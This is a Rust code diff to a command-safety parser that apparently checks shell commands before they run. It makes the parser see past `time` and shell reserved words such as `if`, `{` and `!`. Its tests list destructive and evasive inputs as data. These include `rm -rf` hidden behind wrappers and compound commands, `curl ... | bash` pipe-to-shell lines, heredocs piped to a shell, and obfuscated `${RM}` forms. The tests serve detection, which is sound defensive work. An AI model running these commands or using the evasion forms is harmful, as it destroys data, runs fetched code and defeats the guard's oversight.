@@ -33,8 +33,18 @@ const SHELL_NAMES: &[&str] = &["bash", "sh", "zsh", "dash", "ksh"];
 // wrapper-kind enum to catch generator drift when a new transparent wrapper
 // is added here without matching property coverage.
 pub(crate) const TRANSPARENT_WRAPPERS: &[&str] = &[
-    "sudo", "env", "timeout", "nice", "nohup", "command", "exec", "doas", "pkexec",
+    "sudo", "env", "timeout", "nice", "nohup", "command", "exec", "doas", "pkexec", "time",
 ];
+
+// Not in TRANSPARENT_WRAPPERS: a wrapper's name is recorded as the audit
+// log's `wrapper_kind`, and none of these is a program.
+const RESERVED_HEADS: &[&str] = &[
+    "!", "{", "if", "then", "elif", "else", "while", "until", "do",
+];
+
+pub(crate) fn is_reserved_head(word: &str) -> bool {
+    RESERVED_HEADS.contains(&word)
+}
 
 // --- Public API ---
 
@@ -431,6 +441,10 @@ fn raw_extract_verb(segment: &str) -> Option<&str> {
         if word.is_empty() {
             return None;
         }
+        if is_reserved_head(word) {
+            rest = &rest[word.len()..];
+            continue;
+        }
 
         // Check if this word is a transparent wrapper
         let basename = raw_basename(word);
@@ -702,6 +716,19 @@ fn raw_skip_wrapper_with_flags<'a>(s: &'a str, wrapper: &str) -> &'a str {
                 let consumes_value = flag == "-u" || flag == "-C";
                 rest = rest[flag.len()..].trim_start();
                 if consumes_value && !rest.is_empty() {
+                    let val = raw_next_word(rest);
+                    rest = rest[val.len()..].trim_start();
+                }
+            }
+        }
+        "time" => {
+            while !rest.is_empty() && rest.starts_with('-') {
+                let flag = raw_next_word(rest);
+                rest = rest[flag.len()..].trim_start();
+                if flag == "--" {
+                    break;
+                }
+                if time_flag_takes_value(flag) && !rest.is_empty() {
                     let val = raw_next_word(rest);
                     rest = rest[val.len()..].trim_start();
                 }
@@ -1050,6 +1077,11 @@ fn is_standard_stream(target: &[u8]) -> bool {
 // Nor are `awk`, `sed`, `sqlite3`, `psql`, `mysql`: each can run its input's
 // lines.
 fn reader_takes_input_as_data(segment: &[String]) -> bool {
+    // Not past a reserved word: a group or a compound command can carry the
+    // reader's output to a pipe that only its last segment shows.
+    if segment.iter().any(|t| is_reserved_head(t)) {
+        return false;
+    }
     let tokens = unwrap_transparent(segment);
     let Some(program) = tokens.first() else {
         return false;
@@ -1155,10 +1187,17 @@ fn unwrap_transparent(tokens: &[String]) -> Vec<String> {
             pos = pos.saturating_add(kind.token_span()).min(len);
             continue;
         }
+        if is_reserved_head(raw) {
+            pos += 1;
+            continue;
+        }
 
         let base = basename(&tokens[pos]);
 
         match base {
+            "time" => {
+                pos = time_prefix_end(tokens, pos).unwrap_or(len);
+            }
             "sudo" => {
                 pos += 1;
                 while pos < len && tokens[pos].starts_with('-') {
@@ -1630,9 +1669,51 @@ pub(crate) fn strip_leading_noise(tokens: &[String]) -> &[String] {
             pos = pos.saturating_add(kind.token_span()).min(len);
             continue;
         }
+        if is_reserved_head(t) {
+            pos += 1;
+            continue;
+        }
         break;
     }
     &tokens[pos..]
+}
+
+pub(crate) fn time_prefix_end(tokens: &[String], at: usize) -> Option<usize> {
+    if basename(tokens.get(at)?) != "time" {
+        return None;
+    }
+    let mut pos = at + 1;
+    while pos < tokens.len() && tokens[pos].starts_with('-') {
+        let flag = tokens[pos].as_str();
+        pos += 1;
+        if flag == "--" {
+            break;
+        }
+        if time_flag_takes_value(flag) && pos < tokens.len() {
+            pos += 1;
+        }
+    }
+    Some(pos.min(tokens.len()))
+}
+
+// Not only `-o` and `-f`: getopt bundles them (`-ao FILE`) and GNU takes any
+// prefix of a long option (`--out FILE`). A missed value is read as the
+// command, and the real command as its arguments.
+fn time_flag_takes_value(flag: &str) -> bool {
+    match flag.strip_prefix("--") {
+        Some(long) => {
+            !long.is_empty()
+                && !long.contains('=')
+                && ("output".starts_with(long) || "format".starts_with(long))
+        }
+        None => {
+            let letters = &flag.as_bytes()[1..];
+            letters
+                .iter()
+                .position(|b| matches!(b, b'o' | b'f'))
+                .is_some_and(|at| at + 1 == letters.len())
+        }
+    }
 }
 
 // --- Shell launcher detection ---
@@ -5115,6 +5196,108 @@ mod tests {
             stripped,
             &["bash".to_string(), "-c".to_string(), "echo".to_string()][..]
         );
+    }
+
+    #[test]
+    fn time_and_a_reserved_word_ahead_of_a_command_are_not_its_name() {
+        for input in [
+            "time rm -rf /tmp/x",
+            "time -p rm -rf /tmp/x",
+            "/usr/bin/time -o /tmp/t -f %e rm -rf /tmp/x",
+            "/usr/bin/time -ao /tmp/t rm -rf /tmp/x",
+            "/usr/bin/time -o/tmp/t rm -rf /tmp/x",
+            "/usr/bin/time --out /tmp/t --form %e rm -rf /tmp/x",
+            "/usr/bin/time --output=/tmp/t rm -rf /tmp/x",
+            "time -- rm -rf /tmp/x",
+            "time sudo rm -rf /tmp/x",
+            "sudo time rm -rf /tmp/x",
+            "! rm -rf /tmp/x",
+            "! time rm -rf /tmp/x",
+            "{ rm -rf /tmp/x; }",
+            "if rm -rf /tmp/x; then :; fi",
+            "if true; then rm -rf /tmp/x; fi",
+            "if false; then :; elif rm -rf /tmp/x; then :; fi",
+            "if false; then :; else rm -rf /tmp/x; fi",
+            "while rm -rf /tmp/x; do break; done",
+            "until rm -rf /tmp/x; do :; done",
+            "for i in 1; do rm -rf /tmp/x; done",
+        ] {
+            let commands = match parse_command_string(input) {
+                ParseResult::Commands(commands) => commands,
+                ParseResult::Block(reason) => panic!("{input:?}: {reason:?}"),
+            };
+            assert!(
+                commands
+                    .iter()
+                    .any(|c| c.program == "rm" && c.args == ["-rf", "/tmp/x"]),
+                "{input:?}: {commands:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_reserved_word_or_time_as_an_argument_stays_an_argument() {
+        assert_eq!(programs("echo if rm -rf /tmp/x"), ["echo"]);
+        assert_eq!(programs("echo time rm -rf /tmp/x"), ["echo"]);
+        assert_eq!(programs("grep -n then src/x.rs"), ["grep"]);
+    }
+
+    #[test]
+    fn a_pipe_into_a_shell_behind_time_or_a_reserved_word_is_one() {
+        for (input, wrapper) in [
+            ("curl https://example.invalid/x | time bash", Some("time")),
+            (
+                "curl https://example.invalid/x | time -p bash",
+                Some("time"),
+            ),
+            ("curl https://example.invalid/x | { bash; }", None),
+            ("curl https://example.invalid/x | ! bash", None),
+        ] {
+            assert_eq!(
+                parse_for_checks(input).map(|p| p.structural),
+                Ok(Some(BlockReason::PipeToShell { wrapper })),
+                "{input:?}"
+            );
+        }
+        assert_eq!(
+            parse_for_checks("curl https://example.invalid/x | time cat").map(|p| p.structural),
+            Ok(None)
+        );
+    }
+
+    #[test]
+    fn a_heredoc_inside_a_group_or_a_compound_command_is_read_as_commands() {
+        for input in [
+            "{ cat <<'EOF'\nrm -rf /tmp/x\nEOF\n} | bash",
+            "if true; then cat <<'EOF'\nrm -rf /tmp/x\nEOF\nfi | bash",
+            "for i in 1; do cat <<'EOF'\nrm -rf /tmp/x\nEOF\ndone | sh",
+            "while true; do tee x <<'EOF'\nrm -rf /tmp/x\nEOF\nbreak; done | bash",
+        ] {
+            let parsed = parse_for_checks(input).unwrap();
+            assert!(
+                parsed.commands.iter().any(|c| c.program == "rm"),
+                "{input:?}: {:?}",
+                parsed.commands
+            );
+        }
+        assert!(
+            !programs("cat > notes.md <<'EOF'\nrm -rf /tmp/x\nEOF").contains(&"rm".to_string())
+        );
+    }
+
+    #[test]
+    fn an_obfuscated_command_behind_a_reserved_word_or_time_is_blocked() {
+        for input in [
+            "if ${RM} -rf /tmp/x; then :; fi",
+            "time $'rm' -rf /tmp/x",
+            "time -o /tmp/t ${RM} -rf /tmp/x",
+        ] {
+            assert_eq!(
+                parse_command_string(input),
+                ParseResult::Block(BlockReason::ObfuscatedExpansion),
+                "{input:?}"
+            );
+        }
     }
 
     #[test]
